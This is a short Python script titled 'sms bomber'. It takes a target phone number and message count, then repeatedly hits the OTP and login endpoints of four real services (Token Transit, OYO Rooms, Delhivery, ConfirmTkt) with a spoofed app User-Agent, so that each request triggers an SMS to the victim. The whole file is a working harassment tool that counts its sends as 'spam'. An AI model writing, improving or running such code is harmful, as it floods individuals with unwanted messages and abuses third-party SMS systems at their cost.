from tqdm import tqdm
import requests
import random
print("""
     _.-^^---....,,----       
 _--        sms        --__  
<          bomber         >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
""")
headers = ({'User-Agent':
        'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
phoneNumber = input("Enter phone number: ")
phoneNumber = str(phoneNumber)
url = ["https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber ,"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" +str(91) + "&nod=4&phone=" + phoneNumber , "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + phoneNumber, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + phoneNumber]
numofmsgs = int(input("Enter number of messages to send: "))
successspamCount = 0
failspamCount = 0
for i in tqdm(range(numofmsgs)):
    resp = requests.get(random.choice(url))
    if resp.status_code == 200:
        successspamCount = successspamCount + 1
    else:
        failspamCount = failspamCount + 1
print("Total successful messages sent: ",  successspamCount)
print("Total failed messages sent: ", failspamCount)
